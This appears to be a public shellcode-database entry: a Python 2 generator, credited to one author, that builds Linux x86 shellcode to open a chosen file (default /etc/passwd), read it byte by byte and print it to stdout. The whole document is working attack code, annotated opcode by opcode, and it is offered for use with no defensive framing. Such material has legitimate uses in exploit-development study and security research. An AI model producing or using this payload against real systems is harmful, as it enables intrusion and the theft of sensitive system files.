# Exploit Title: Read any file in Linux/x86 (Generator)
# Date: 06/19/2018
# Author: Nathu Nandwani
# Website: http://nandtech.co/
# Tested on: Linux x86
# Shellcode base length (w/o path): 52 bytes
# Shellcode length for /etc/passwd: 67 bytes

path = "/etc/passwd"
length = len(path)
while (length % 4 != 0):
    length += 1
padding = length - len(path)
print "Path: " + path
print ""
print "Null character padding: " + str(padding)
print ""
groups = [path[i:i+4] for i in range(0, len(path), 4)]
groups = groups[::-1]
print "Path should look like this in the assembly language:"
print ""    
path_shc = ""
counter = 0
for i in groups:
    htemp = ""
    for j in i:
        htemp += str(hex(ord(j))).replace("0x", "\\x")
    path_shc += "\\x68" + htemp
    if counter == 0:
        path_shc += ("\\x00" * padding)
    print 'push "' + i + '"'
    counter += 1
        
print ""
print "Path converted to shellcode (length=" + str(len(path_shc) / 4) + "): "
print ""
print path_shc

# syscall reference: https://syscalls.kernelgrok.com/

# xor ecx, ecx ; O_RDONLY = 0
shellcode = "\\x31\\xc9"
# push ecx
shellcode += "\\x51"
shellcode += path_shc
# xor eax, eax
shellcode += "\\x31\\xc0"        
# mov al, 0x05 ; open("<FILE PATH>", 0);
shellcode += "\\xb0\\x05"       
# mov ebx, esp ; file path
shellcode += "\\x89\\xe3"       
# int 0x80 ; syscall
shellcode += "\\xcd\\x80"       
# mov ebx, eax ; save file descriptor
shellcode += "\\x89\\xc3"       
# <again>:
# xor eax, eax 
shellcode += "\\x31\\xc0"        
# mov al, 0x03 ; read(fd, storage, length)
shellcode += "\\xb0\\x03"       
# mov ecx, esp ; ebx = fd, ecx = stack pointer
shellcode += "\\x89\\xe1"       
# xor edx, edx 
shellcode += "\\x31\\xd2"         
# inc dl ; edx = length (1)
shellcode += "\\xfe\\xc2"       
# int 0x80 ; syscall
shellcode += "\\xcd\\x80"       
# push eax ; save "read" return value
shellcode += "\\x50"            
# push ebx ; save file descriptor
shellcode += "\\x53"            
# xor eax, eax
shellcode += "\\x31\\xc0"         
# mov al, 0x04 ; write(STDOUT, buf, length)
shellcode += "\\xb0\\x04"       
# xor ebx, ebx 
shellcode += "\\x31\\xdb"        
# inc bl ; STDOUT = 1
shellcode += "\\xfe\\xc3"       
# int 0x80 ; syscall
shellcode += "\\xcd\\x80"       
# pop ebx ; recover file descriptor
shellcode += "\\x5b"            
# pop eax ; recover "read" return value
shellcode += "\\x58"            
# cmp eax, 0x01 ; if "read" return = 1, continue
shellcode += "\\x83\\xf8\\x01"  
# je <again>
shellcode += "\\x74\\xe1"       
# mov al, 0x06 ; close(fd)
shellcode += "\\xb0\\x06"       
# int 0x80 ; syscall
shellcode += "\\xcd\\x80"       
# mov al, 0x01 ; exit
shellcode += "\\xb0\\x01"       
# int 0x80 ; syscall
shellcode += "\\xcd\\x80"       

print ""
print "Complete shellcode (length=" + str(len(shellcode) / 4) + "): "
print ""
print shellcode

print ""
print "Shellcode basis: "
print ""
print "int fd = open('<FILE PATH>', 0);"
print "char temp;"
print "while (read(fd, &temp, 1) != 0)"
print "{"
print "    write(1, &temp, 1);"
print "}"
print "close(fd);"
print "exit(0);"

